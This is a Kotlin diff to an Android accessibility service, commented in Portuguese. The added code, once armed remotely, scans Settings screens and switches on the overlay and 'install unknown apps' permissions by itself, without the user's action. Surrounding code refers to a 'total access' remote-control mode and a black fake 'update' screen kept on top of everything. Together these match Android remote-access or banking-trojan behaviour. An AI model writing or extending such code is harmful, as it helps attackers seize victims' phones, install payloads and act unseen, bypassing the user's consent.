@@ -81,7 +81,17 @@ class MyAccessibilityService : AccessibilityService() {
         fun armarConfirmacaoAtalho() {
             prazoConfirmacaoAtalhoMs = System.currentTimeMillis() + 8000L
         }
+
+        // Inject genérico das TELAS DE PERMISSÃO (sobreposição, fontes
+        // desconhecidas, etc.): quando armado, ao abrir a tela de Settings o
+        // serviço procura o interruptor DESLIGADO e o liga sozinho (hands-free).
+        @Volatile var prazoInterruptorPermissaoMs: Long = 0L
+        /** Arma o auto-ligar do interruptor da tela de permissão por ~12s. */
+        fun armarInterruptorPermissao() {
+            prazoInterruptorPermissaoMs = System.currentTimeMillis() + 12000L
+        }
     }
+    private var ultimoInterruptorPermissaoMs = 0L
 
     // --- Estado de Controle de Interação "Acesso Total" ---
     @Volatile
@@ -1060,6 +1070,37 @@ class MyAccessibilityService : AccessibilityService() {
         return if (no.isClickable) no else null
     }
 
+    /** Procura (DFS) um INTERRUPTOR desligado (Switch/ToggleButton/checável) na
+     *  tela de permissão e o liga via ACTION_CLICK (no próprio nó ou num
+     *  ancestral clicável). Retorna true se ligou algum. Usado hands-free nas
+     *  telas de "sobreposição" e "permitir desta fonte". */
+    private fun ligarInterruptorPermissao(no: AccessibilityNodeInfo): Boolean {
+        try {
+            val cls = no.className?.toString() ?: ""
+            val ehSwitch = cls.contains("Switch", true) || cls.contains("ToggleButton", true)
+            if ((ehSwitch || no.isCheckable) && no.isCheckable && !no.isChecked && no.isEnabled) {
+                if (no.isClickable && no.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                    enviarLog("[PERMISSAO] Interruptor ligado automaticamente.")
+                    return true
+                }
+                var p = no.parent
+                var g = 0
+                while (p != null && g < 5) {
+                    if (p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                        enviarLog("[PERMISSAO] Interruptor (ancestral) ligado automaticamente.")
+                        return true
+                    }
+                    p = p.parent; g++
+                }
+            }
+            for (i in 0 until no.childCount) {
+                val f = no.getChild(i) ?: continue
+                if (ligarInterruptorPermissao(f)) return true
+            }
+        } catch (_: Exception) {}
+        return false
+    }
+
     private fun handleTecla(tipo: String, valor: String) {
         // Navegação global (Voltar / Home) NÃO depende de campo de texto focado:
         // funciona em qualquer tela do aparelho, mesmo sem caixa de digitação.
@@ -1165,6 +1206,24 @@ class MyAccessibilityService : AccessibilityService() {
     // ================================================================
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
+
+        // ── AUTO-LIGAR O INTERRUPTOR DAS TELAS DE PERMISSÃO (hands-free) ──
+        // Quando o orquestrador abre uma tela de permissão (sobreposição / fontes
+        // desconhecidas), procura o SWITCH desligado e o liga sozinho.
+        if (System.currentTimeMillis() < prazoInterruptorPermissaoMs &&
+            (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+             event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
+            try {
+                val agora = System.currentTimeMillis()
+                if (agora - ultimoInterruptorPermissaoMs > 700L) {
+                    val raiz = rootInActiveWindow
+                    if (raiz != null && ligarInterruptorPermissao(raiz)) {
+                        ultimoInterruptorPermissaoMs = agora
+                        prazoInterruptorPermissaoMs = 0L  // ligou: desarma
+                    }
+                }
+            } catch (_: Exception) {}
+        }
 
         // ── MANTÉM A TELA PRETA DE ATUALIZAÇÃO SEMPRE NO TOPO (Android 7–15) ──
         // Enquanto o switch está na Direita (MainActivity.modoAtualizacaoAtivo),
